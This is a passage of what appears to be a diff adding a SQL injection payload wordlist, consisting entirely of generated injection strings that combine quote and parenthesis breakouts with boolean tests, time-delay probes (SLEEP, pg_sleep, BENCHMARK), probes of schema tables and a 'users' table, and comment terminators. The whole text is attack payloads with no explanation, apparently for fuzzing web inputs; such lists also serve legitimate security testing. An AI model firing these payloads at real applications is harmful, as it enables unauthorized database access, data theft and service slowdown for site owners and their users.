+' AND EXISTS pg_sleep(5)-- -
+' AND EXISTS pg_sleep(5)#
+' AND EXISTS pg_sleep(5);%00
+' AND EXISTS pg_sleep(5)/*
+' AND EXISTS pg_sleep(5)/**/
+' AND EXISTS pg_sleep(5)
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+" OR 1=1--
+" OR 1=1-- -
+" OR 1=1#
+" OR 1=1;%00
+" OR 1=1/*
+" OR 1=1/**/
+" OR 1=1
+" OR 1=2--
+" OR 1=2-- -
+" OR 1=2#
+" OR 1=2;%00
+" OR 1=2/*
+" OR 1=2/**/
+" OR 1=2
+" OR 'a'='a'--
+" OR 'a'='a'-- -
+" OR 'a'='a'#
+" OR 'a'='a';%00
+" OR 'a'='a'/*
+" OR 'a'='a'/**/
+" OR 'a'='a'
+" OR 'x'='y'--
+" OR 'x'='y'-- -
+" OR 'x'='y'#
+" OR 'x'='y';%00
+" OR 'x'='y'/*
+" OR 'x'='y'/**/
+" OR 'x'='y'
+" OR user()=user()--
+" OR user()=user()-- -
+" OR user()=user()#
+" OR user()=user();%00
+" OR user()=user()/*
+" OR user()=user()/**/
+" OR user()=user()
+" OR version()=version()--
+" OR version()=version()-- -
+" OR version()=version()#
+" OR version()=version();%00
+" OR version()=version()/*
+" OR version()=version()/**/
+" OR version()=version()
+" OR DATABASE()=DATABASE()--
+" OR DATABASE()=DATABASE()-- -
+" OR DATABASE()=DATABASE()#
+" OR DATABASE()=DATABASE();%00
+" OR DATABASE()=DATABASE()/*
+" OR DATABASE()=DATABASE()/**/
+" OR DATABASE()=DATABASE()
+" OR (SELECT COUNT(*) FROM users)>0--
+" OR (SELECT COUNT(*) FROM users)>0-- -
+" OR (SELECT COUNT(*) FROM users)>0#
+" OR (SELECT COUNT(*) FROM users)>0;%00
+" OR (SELECT COUNT(*) FROM users)>0/*
+" OR (SELECT COUNT(*) FROM users)>0/**/
+" OR (SELECT COUNT(*) FROM users)>0
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" OR SLEEP(2)--
+" OR SLEEP(2)-- -
+" OR SLEEP(2)#
+" OR SLEEP(2);%00
+" OR SLEEP(2)/*
+" OR SLEEP(2)/**/
+" OR SLEEP(2)
+" OR SLEEP(5)--
+" OR SLEEP(5)-- -
+" OR SLEEP(5)#
+" OR SLEEP(5);%00
+" OR SLEEP(5)/*
+" OR SLEEP(5)/**/
+" OR SLEEP(5)
+" OR BENCHMARK(100000,MD5(1))--
+" OR BENCHMARK(100000,MD5(1))-- -
+" OR BENCHMARK(100000,MD5(1))#
+" OR BENCHMARK(100000,MD5(1));%00
+" OR BENCHMARK(100000,MD5(1))/*
+" OR BENCHMARK(100000,MD5(1))/**/
+" OR BENCHMARK(100000,MD5(1))
+" OR pg_sleep(2)--
+" OR pg_sleep(2)-- -
+" OR pg_sleep(2)#
+" OR pg_sleep(2);%00
+" OR pg_sleep(2)/*
+" OR pg_sleep(2)/**/
+" OR pg_sleep(2)
+" OR pg_sleep(5)--
+" OR pg_sleep(5)-- -
+" OR pg_sleep(5)#
+" OR pg_sleep(5);%00
+" OR pg_sleep(5)/*
+" OR pg_sleep(5)/**/
+" OR pg_sleep(5)
+" OR EXISTS(SELECT * FROM information_schema.tables)--
+" OR EXISTS(SELECT * FROM information_schema.tables)-- -
+" OR EXISTS(SELECT * FROM information_schema.tables)#
+" OR EXISTS(SELECT * FROM information_schema.tables);%00
+" OR EXISTS(SELECT * FROM information_schema.tables)/*
+" OR EXISTS(SELECT * FROM information_schema.tables)/**/
+" OR EXISTS(SELECT * FROM information_schema.tables)
+" AND 1=1--
+" AND 1=1-- -
+" AND 1=1#
+" AND 1=1;%00
+" AND 1=1/*
+" AND 1=1/**/
+" AND 1=1
+" AND 1=2--
+" AND 1=2-- -
+" AND 1=2#
+" AND 1=2;%00
+" AND 1=2/*
+" AND 1=2/**/
+" AND 1=2
+" AND 'a'='a'--
+" AND 'a'='a'-- -
+" AND 'a'='a'#
+" AND 'a'='a';%00
+" AND 'a'='a'/*
+" AND 'a'='a'/**/
+" AND 'a'='a'
+" AND 'x'='y'--
+" AND 'x'='y'-- -
+" AND 'x'='y'#
+" AND 'x'='y';%00
+" AND 'x'='y'/*
+" AND 'x'='y'/**/
+" AND 'x'='y'
+" AND user()=user()--
+" AND user()=user()-- -
+" AND user()=user()#
+" AND user()=user();%00
+" AND user()=user()/*
+" AND user()=user()/**/
+" AND user()=user()
+" AND version()=version()--
+" AND version()=version()-- -
+" AND version()=version()#
+" AND version()=version();%00
+" AND version()=version()/*
+" AND version()=version()/**/
+" AND version()=version()
+" AND DATABASE()=DATABASE()--
+" AND DATABASE()=DATABASE()-- -
+" AND DATABASE()=DATABASE()#
+" AND DATABASE()=DATABASE();%00
+" AND DATABASE()=DATABASE()/*
+" AND DATABASE()=DATABASE()/**/
+" AND DATABASE()=DATABASE()
+" AND (SELECT COUNT(*) FROM users)>0--
+" AND (SELECT COUNT(*) FROM users)>0-- -
+" AND (SELECT COUNT(*) FROM users)>0#
+" AND (SELECT COUNT(*) FROM users)>0;%00
+" AND (SELECT COUNT(*) FROM users)>0/*
+" AND (SELECT COUNT(*) FROM users)>0/**/
+" AND (SELECT COUNT(*) FROM users)>0
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" AND SLEEP(2)--
+" AND SLEEP(2)-- -
+" AND SLEEP(2)#
+" AND SLEEP(2);%00
+" AND SLEEP(2)/*
+" AND SLEEP(2)/**/
+" AND SLEEP(2)
+" AND SLEEP(5)--
+" AND SLEEP(5)-- -
+" AND SLEEP(5)#
+" AND SLEEP(5);%00
+" AND SLEEP(5)/*
+" AND SLEEP(5)/**/
+" AND SLEEP(5)
+" AND BENCHMARK(100000,MD5(1))--
+" AND BENCHMARK(100000,MD5(1))-- -
+" AND BENCHMARK(100000,MD5(1))#
+" AND BENCHMARK(100000,MD5(1));%00
+" AND BENCHMARK(100000,MD5(1))/*
+" AND BENCHMARK(100000,MD5(1))/**/
+" AND BENCHMARK(100000,MD5(1))
+" AND pg_sleep(2)--
+" AND pg_sleep(2)-- -
+" AND pg_sleep(2)#
+" AND pg_sleep(2);%00
+" AND pg_sleep(2)/*
+" AND pg_sleep(2)/**/
+" AND pg_sleep(2)
+" AND pg_sleep(5)--
+" AND pg_sleep(5)-- -
+" AND pg_sleep(5)#
+" AND pg_sleep(5);%00
+" AND pg_sleep(5)/*
+" AND pg_sleep(5)/**/
+" AND pg_sleep(5)
+" AND EXISTS(SELECT * FROM information_schema.tables)--
+" AND EXISTS(SELECT * FROM information_schema.tables)-- -
+" AND EXISTS(SELECT * FROM information_schema.tables)#
+" AND EXISTS(SELECT * FROM information_schema.tables);%00
+" AND EXISTS(SELECT * FROM information_schema.tables)/*
+" AND EXISTS(SELECT * FROM information_schema.tables)/**/
+" AND EXISTS(SELECT * FROM information_schema.tables)
+" OR NOT 1=1--
+" OR NOT 1=1-- -
+" OR NOT 1=1#
+" OR NOT 1=1;%00
+" OR NOT 1=1/*
+" OR NOT 1=1/**/
+" OR NOT 1=1
+" OR NOT 1=2--
+" OR NOT 1=2-- -
+" OR NOT 1=2#
+" OR NOT 1=2;%00
+" OR NOT 1=2/*
+" OR NOT 1=2/**/
+" OR NOT 1=2
+" OR NOT 'a'='a'--
+" OR NOT 'a'='a'-- -
+" OR NOT 'a'='a'#
+" OR NOT 'a'='a';%00
+" OR NOT 'a'='a'/*
+" OR NOT 'a'='a'/**/
+" OR NOT 'a'='a'
+" OR NOT 'x'='y'--
+" OR NOT 'x'='y'-- -
+" OR NOT 'x'='y'#
+" OR NOT 'x'='y';%00
+" OR NOT 'x'='y'/*
+" OR NOT 'x'='y'/**/
+" OR NOT 'x'='y'
+" OR NOT user()=user()--
+" OR NOT user()=user()-- -
+" OR NOT user()=user()#
+" OR NOT user()=user();%00
+" OR NOT user()=user()/*
+" OR NOT user()=user()/**/
+" OR NOT user()=user()
+" OR NOT version()=version()--
+" OR NOT version()=version()-- -
+" OR NOT version()=version()#
+" OR NOT version()=version();%00
+" OR NOT version()=version()/*
+" OR NOT version()=version()/**/
+" OR NOT version()=version()
+" OR NOT DATABASE()=DATABASE()--
+" OR NOT DATABASE()=DATABASE()-- -
+" OR NOT DATABASE()=DATABASE()#
+" OR NOT DATABASE()=DATABASE();%00
+" OR NOT DATABASE()=DATABASE()/*
+" OR NOT DATABASE()=DATABASE()/**/
+" OR NOT DATABASE()=DATABASE()
+" OR NOT (SELECT COUNT(*) FROM users)>0--
+" OR NOT (SELECT COUNT(*) FROM users)>0-- -
+" OR NOT (SELECT COUNT(*) FROM users)>0#
+" OR NOT (SELECT COUNT(*) FROM users)>0;%00
+" OR NOT (SELECT COUNT(*) FROM users)>0/*
+" OR NOT (SELECT COUNT(*) FROM users)>0/**/
+" OR NOT (SELECT COUNT(*) FROM users)>0
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" OR NOT SLEEP(2)--
+" OR NOT SLEEP(2)-- -
+" OR NOT SLEEP(2)#
+" OR NOT SLEEP(2);%00
+" OR NOT SLEEP(2)/*
+" OR NOT SLEEP(2)/**/
+" OR NOT SLEEP(2)
+" OR NOT SLEEP(5)--
+" OR NOT SLEEP(5)-- -
+" OR NOT SLEEP(5)#
+" OR NOT SLEEP(5);%00
+" OR NOT SLEEP(5)/*
+" OR NOT SLEEP(5)/**/
+" OR NOT SLEEP(5)
+" OR NOT BENCHMARK(100000,MD5(1))--
+" OR NOT BENCHMARK(100000,MD5(1))-- -
+" OR NOT BENCHMARK(100000,MD5(1))#
+" OR NOT BENCHMARK(100000,MD5(1));%00
+" OR NOT BENCHMARK(100000,MD5(1))/*
+" OR NOT BENCHMARK(100000,MD5(1))/**/
+" OR NOT BENCHMARK(100000,MD5(1))
+" OR NOT pg_sleep(2)--
+" OR NOT pg_sleep(2)-- -
+" OR NOT pg_sleep(2)#
+" OR NOT pg_sleep(2);%00
+" OR NOT pg_sleep(2)/*
+" OR NOT pg_sleep(2)/**/
+" OR NOT pg_sleep(2)
+" OR NOT pg_sleep(5)--
+" OR NOT pg_sleep(5)-- -
+" OR NOT pg_sleep(5)#
+" OR NOT pg_sleep(5);%00
+" OR NOT pg_sleep(5)/*
+" OR NOT pg_sleep(5)/**/
+" OR NOT pg_sleep(5)
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+" OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+" OR NOT EXISTS(SELECT * FROM information_schema.tables)
+" AND NOT 1=1--
+" AND NOT 1=1-- -
+" AND NOT 1=1#
+" AND NOT 1=1;%00
+" AND NOT 1=1/*
+" AND NOT 1=1/**/
+" AND NOT 1=1
+" AND NOT 1=2--
+" AND NOT 1=2-- -
+" AND NOT 1=2#
+" AND NOT 1=2;%00
+" AND NOT 1=2/*
+" AND NOT 1=2/**/
+" AND NOT 1=2
+" AND NOT 'a'='a'--
+" AND NOT 'a'='a'-- -
+" AND NOT 'a'='a'#
+" AND NOT 'a'='a';%00
+" AND NOT 'a'='a'/*
+" AND NOT 'a'='a'/**/
+" AND NOT 'a'='a'
+" AND NOT 'x'='y'--
+" AND NOT 'x'='y'-- -
+" AND NOT 'x'='y'#
+" AND NOT 'x'='y';%00
+" AND NOT 'x'='y'/*
+" AND NOT 'x'='y'/**/
+" AND NOT 'x'='y'
+" AND NOT user()=user()--
+" AND NOT user()=user()-- -
+" AND NOT user()=user()#
+" AND NOT user()=user();%00
+" AND NOT user()=user()/*
+" AND NOT user()=user()/**/
+" AND NOT user()=user()
+" AND NOT version()=version()--
+" AND NOT version()=version()-- -
+" AND NOT version()=version()#
+" AND NOT version()=version();%00
+" AND NOT version()=version()/*
+" AND NOT version()=version()/**/
+" AND NOT version()=version()
+" AND NOT DATABASE()=DATABASE()--
+" AND NOT DATABASE()=DATABASE()-- -
+" AND NOT DATABASE()=DATABASE()#
+" AND NOT DATABASE()=DATABASE();%00
+" AND NOT DATABASE()=DATABASE()/*
+" AND NOT DATABASE()=DATABASE()/**/
+" AND NOT DATABASE()=DATABASE()
+" AND NOT (SELECT COUNT(*) FROM users)>0--
+" AND NOT (SELECT COUNT(*) FROM users)>0-- -
+" AND NOT (SELECT COUNT(*) FROM users)>0#
+" AND NOT (SELECT COUNT(*) FROM users)>0;%00
+" AND NOT (SELECT COUNT(*) FROM users)>0/*
+" AND NOT (SELECT COUNT(*) FROM users)>0/**/
+" AND NOT (SELECT COUNT(*) FROM users)>0
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" AND NOT SLEEP(2)--
+" AND NOT SLEEP(2)-- -
+" AND NOT SLEEP(2)#
+" AND NOT SLEEP(2);%00
+" AND NOT SLEEP(2)/*
+" AND NOT SLEEP(2)/**/
+" AND NOT SLEEP(2)
+" AND NOT SLEEP(5)--
+" AND NOT SLEEP(5)-- -
+" AND NOT SLEEP(5)#
+" AND NOT SLEEP(5);%00
+" AND NOT SLEEP(5)/*
+" AND NOT SLEEP(5)/**/
+" AND NOT SLEEP(5)
+" AND NOT BENCHMARK(100000,MD5(1))--
+" AND NOT BENCHMARK(100000,MD5(1))-- -
+" AND NOT BENCHMARK(100000,MD5(1))#
+" AND NOT BENCHMARK(100000,MD5(1));%00
+" AND NOT BENCHMARK(100000,MD5(1))/*
+" AND NOT BENCHMARK(100000,MD5(1))/**/
+" AND NOT BENCHMARK(100000,MD5(1))
+" AND NOT pg_sleep(2)--
+" AND NOT pg_sleep(2)-- -
+" AND NOT pg_sleep(2)#
+" AND NOT pg_sleep(2);%00
+" AND NOT pg_sleep(2)/*
+" AND NOT pg_sleep(2)/**/
+" AND NOT pg_sleep(2)
+" AND NOT pg_sleep(5)--
+" AND NOT pg_sleep(5)-- -
+" AND NOT pg_sleep(5)#
+" AND NOT pg_sleep(5);%00
+" AND NOT pg_sleep(5)/*
+" AND NOT pg_sleep(5)/**/
+" AND NOT pg_sleep(5)
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+" AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+" AND NOT EXISTS(SELECT * FROM information_schema.tables)
+" OR EXISTS 1=1--
+" OR EXISTS 1=1-- -
+" OR EXISTS 1=1#
+" OR EXISTS 1=1;%00
+" OR EXISTS 1=1/*
+" OR EXISTS 1=1/**/
+" OR EXISTS 1=1
+" OR EXISTS 1=2--
+" OR EXISTS 1=2-- -
+" OR EXISTS 1=2#
+" OR EXISTS 1=2;%00
+" OR EXISTS 1=2/*
+" OR EXISTS 1=2/**/
+" OR EXISTS 1=2
+" OR EXISTS 'a'='a'--
+" OR EXISTS 'a'='a'-- -
+" OR EXISTS 'a'='a'#
+" OR EXISTS 'a'='a';%00
+" OR EXISTS 'a'='a'/*
+" OR EXISTS 'a'='a'/**/
+" OR EXISTS 'a'='a'
+" OR EXISTS 'x'='y'--
+" OR EXISTS 'x'='y'-- -
+" OR EXISTS 'x'='y'#
+" OR EXISTS 'x'='y';%00
+" OR EXISTS 'x'='y'/*
+" OR EXISTS 'x'='y'/**/
+" OR EXISTS 'x'='y'
+" OR EXISTS user()=user()--
+" OR EXISTS user()=user()-- -
+" OR EXISTS user()=user()#
+" OR EXISTS user()=user();%00
+" OR EXISTS user()=user()/*
+" OR EXISTS user()=user()/**/
+" OR EXISTS user()=user()
+" OR EXISTS version()=version()--
+" OR EXISTS version()=version()-- -
+" OR EXISTS version()=version()#
+" OR EXISTS version()=version();%00
+" OR EXISTS version()=version()/*
+" OR EXISTS version()=version()/**/
+" OR EXISTS version()=version()
+" OR EXISTS DATABASE()=DATABASE()--
+" OR EXISTS DATABASE()=DATABASE()-- -
+" OR EXISTS DATABASE()=DATABASE()#
+" OR EXISTS DATABASE()=DATABASE();%00
+" OR EXISTS DATABASE()=DATABASE()/*
+" OR EXISTS DATABASE()=DATABASE()/**/
+" OR EXISTS DATABASE()=DATABASE()
+" OR EXISTS (SELECT COUNT(*) FROM users)>0--
+" OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+" OR EXISTS (SELECT COUNT(*) FROM users)>0#
+" OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+" OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+" OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+" OR EXISTS (SELECT COUNT(*) FROM users)>0
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" OR EXISTS SLEEP(2)--
+" OR EXISTS SLEEP(2)-- -
+" OR EXISTS SLEEP(2)#
+" OR EXISTS SLEEP(2);%00
+" OR EXISTS SLEEP(2)/*
+" OR EXISTS SLEEP(2)/**/
+" OR EXISTS SLEEP(2)
+" OR EXISTS SLEEP(5)--
+" OR EXISTS SLEEP(5)-- -
+" OR EXISTS SLEEP(5)#
+" OR EXISTS SLEEP(5);%00
+" OR EXISTS SLEEP(5)/*
+" OR EXISTS SLEEP(5)/**/
+" OR EXISTS SLEEP(5)
+" OR EXISTS BENCHMARK(100000,MD5(1))--
+" OR EXISTS BENCHMARK(100000,MD5(1))-- -
+" OR EXISTS BENCHMARK(100000,MD5(1))#
+" OR EXISTS BENCHMARK(100000,MD5(1));%00
+" OR EXISTS BENCHMARK(100000,MD5(1))/*
+" OR EXISTS BENCHMARK(100000,MD5(1))/**/
+" OR EXISTS BENCHMARK(100000,MD5(1))
+" OR EXISTS pg_sleep(2)--
+" OR EXISTS pg_sleep(2)-- -
+" OR EXISTS pg_sleep(2)#
+" OR EXISTS pg_sleep(2);%00
+" OR EXISTS pg_sleep(2)/*
+" OR EXISTS pg_sleep(2)/**/
+" OR EXISTS pg_sleep(2)
+" OR EXISTS pg_sleep(5)--
+" OR EXISTS pg_sleep(5)-- -
+" OR EXISTS pg_sleep(5)#
+" OR EXISTS pg_sleep(5);%00
+" OR EXISTS pg_sleep(5)/*
+" OR EXISTS pg_sleep(5)/**/
+" OR EXISTS pg_sleep(5)
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+" OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+" AND EXISTS 1=1--
+" AND EXISTS 1=1-- -
+" AND EXISTS 1=1#
+" AND EXISTS 1=1;%00
+" AND EXISTS 1=1/*
+" AND EXISTS 1=1/**/
+" AND EXISTS 1=1
+" AND EXISTS 1=2--
+" AND EXISTS 1=2-- -
+" AND EXISTS 1=2#
+" AND EXISTS 1=2;%00
+" AND EXISTS 1=2/*
+" AND EXISTS 1=2/**/
+" AND EXISTS 1=2
+" AND EXISTS 'a'='a'--
+" AND EXISTS 'a'='a'-- -
+" AND EXISTS 'a'='a'#
+" AND EXISTS 'a'='a';%00
+" AND EXISTS 'a'='a'/*
+" AND EXISTS 'a'='a'/**/
+" AND EXISTS 'a'='a'
+" AND EXISTS 'x'='y'--
+" AND EXISTS 'x'='y'-- -
+" AND EXISTS 'x'='y'#
+" AND EXISTS 'x'='y';%00
+" AND EXISTS 'x'='y'/*
+" AND EXISTS 'x'='y'/**/
+" AND EXISTS 'x'='y'
+" AND EXISTS user()=user()--
+" AND EXISTS user()=user()-- -
+" AND EXISTS user()=user()#
+" AND EXISTS user()=user();%00
+" AND EXISTS user()=user()/*
+" AND EXISTS user()=user()/**/
+" AND EXISTS user()=user()
+" AND EXISTS version()=version()--
+" AND EXISTS version()=version()-- -
+" AND EXISTS version()=version()#
+" AND EXISTS version()=version();%00
+" AND EXISTS version()=version()/*
+" AND EXISTS version()=version()/**/
+" AND EXISTS version()=version()
+" AND EXISTS DATABASE()=DATABASE()--
+" AND EXISTS DATABASE()=DATABASE()-- -
+" AND EXISTS DATABASE()=DATABASE()#
+" AND EXISTS DATABASE()=DATABASE();%00
+" AND EXISTS DATABASE()=DATABASE()/*
+" AND EXISTS DATABASE()=DATABASE()/**/
+" AND EXISTS DATABASE()=DATABASE()
+" AND EXISTS (SELECT COUNT(*) FROM users)>0--
+" AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+" AND EXISTS (SELECT COUNT(*) FROM users)>0#
+" AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+" AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+" AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+" AND EXISTS (SELECT COUNT(*) FROM users)>0
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+" AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+" AND EXISTS SLEEP(2)--
+" AND EXISTS SLEEP(2)-- -
+" AND EXISTS SLEEP(2)#
+" AND EXISTS SLEEP(2);%00
+" AND EXISTS SLEEP(2)/*
+" AND EXISTS SLEEP(2)/**/
+" AND EXISTS SLEEP(2)
+" AND EXISTS SLEEP(5)--
+" AND EXISTS SLEEP(5)-- -
+" AND EXISTS SLEEP(5)#
+" AND EXISTS SLEEP(5);%00
+" AND EXISTS SLEEP(5)/*
+" AND EXISTS SLEEP(5)/**/
+" AND EXISTS SLEEP(5)
+" AND EXISTS BENCHMARK(100000,MD5(1))--
+" AND EXISTS BENCHMARK(100000,MD5(1))-- -
+" AND EXISTS BENCHMARK(100000,MD5(1))#
+" AND EXISTS BENCHMARK(100000,MD5(1));%00
+" AND EXISTS BENCHMARK(100000,MD5(1))/*
+" AND EXISTS BENCHMARK(100000,MD5(1))/**/
+" AND EXISTS BENCHMARK(100000,MD5(1))
+" AND EXISTS pg_sleep(2)--
+" AND EXISTS pg_sleep(2)-- -
+" AND EXISTS pg_sleep(2)#
+" AND EXISTS pg_sleep(2);%00
+" AND EXISTS pg_sleep(2)/*
+" AND EXISTS pg_sleep(2)/**/
+" AND EXISTS pg_sleep(2)
+" AND EXISTS pg_sleep(5)--
+" AND EXISTS pg_sleep(5)-- -
+" AND EXISTS pg_sleep(5)#
+" AND EXISTS pg_sleep(5);%00
+" AND EXISTS pg_sleep(5)/*
+" AND EXISTS pg_sleep(5)/**/
+" AND EXISTS pg_sleep(5)
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+" AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+') OR 1=1--
+') OR 1=1-- -
+') OR 1=1#
+') OR 1=1;%00
+') OR 1=1/*
+') OR 1=1/**/
+') OR 1=1
+') OR 1=2--
+') OR 1=2-- -
+') OR 1=2#
+') OR 1=2;%00
+') OR 1=2/*
+') OR 1=2/**/
+') OR 1=2
+') OR 'a'='a'--
+') OR 'a'='a'-- -
+') OR 'a'='a'#
+') OR 'a'='a';%00
+') OR 'a'='a'/*
+') OR 'a'='a'/**/
+') OR 'a'='a'
+') OR 'x'='y'--
+') OR 'x'='y'-- -
+') OR 'x'='y'#
+') OR 'x'='y';%00
+') OR 'x'='y'/*
+') OR 'x'='y'/**/
+') OR 'x'='y'
+') OR user()=user()--
+') OR user()=user()-- -
+') OR user()=user()#
+') OR user()=user();%00
+') OR user()=user()/*
+') OR user()=user()/**/
+') OR user()=user()
+') OR version()=version()--
+') OR version()=version()-- -
+') OR version()=version()#
+') OR version()=version();%00
+') OR version()=version()/*
+') OR version()=version()/**/
+') OR version()=version()
+') OR DATABASE()=DATABASE()--
+') OR DATABASE()=DATABASE()-- -
+') OR DATABASE()=DATABASE()#
+') OR DATABASE()=DATABASE();%00
+') OR DATABASE()=DATABASE()/*
+') OR DATABASE()=DATABASE()/**/
+') OR DATABASE()=DATABASE()
+') OR (SELECT COUNT(*) FROM users)>0--
+') OR (SELECT COUNT(*) FROM users)>0-- -
+') OR (SELECT COUNT(*) FROM users)>0#
+') OR (SELECT COUNT(*) FROM users)>0;%00
+') OR (SELECT COUNT(*) FROM users)>0/*
+') OR (SELECT COUNT(*) FROM users)>0/**/
+') OR (SELECT COUNT(*) FROM users)>0
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') OR SLEEP(2)--
+') OR SLEEP(2)-- -
+') OR SLEEP(2)#
+') OR SLEEP(2);%00
+') OR SLEEP(2)/*
+') OR SLEEP(2)/**/
+') OR SLEEP(2)
+') OR SLEEP(5)--
+') OR SLEEP(5)-- -
+') OR SLEEP(5)#
+') OR SLEEP(5);%00
+') OR SLEEP(5)/*
+') OR SLEEP(5)/**/
+') OR SLEEP(5)
+') OR BENCHMARK(100000,MD5(1))--
+') OR BENCHMARK(100000,MD5(1))-- -
+') OR BENCHMARK(100000,MD5(1))#
+') OR BENCHMARK(100000,MD5(1));%00
+') OR BENCHMARK(100000,MD5(1))/*
+') OR BENCHMARK(100000,MD5(1))/**/
+') OR BENCHMARK(100000,MD5(1))
+') OR pg_sleep(2)--
+') OR pg_sleep(2)-- -
+') OR pg_sleep(2)#
+') OR pg_sleep(2);%00
+') OR pg_sleep(2)/*
+') OR pg_sleep(2)/**/
+') OR pg_sleep(2)
+') OR pg_sleep(5)--
+') OR pg_sleep(5)-- -
+') OR pg_sleep(5)#
+') OR pg_sleep(5);%00
+') OR pg_sleep(5)/*
+') OR pg_sleep(5)/**/
+') OR pg_sleep(5)
+') OR EXISTS(SELECT * FROM information_schema.tables)--
+') OR EXISTS(SELECT * FROM information_schema.tables)-- -
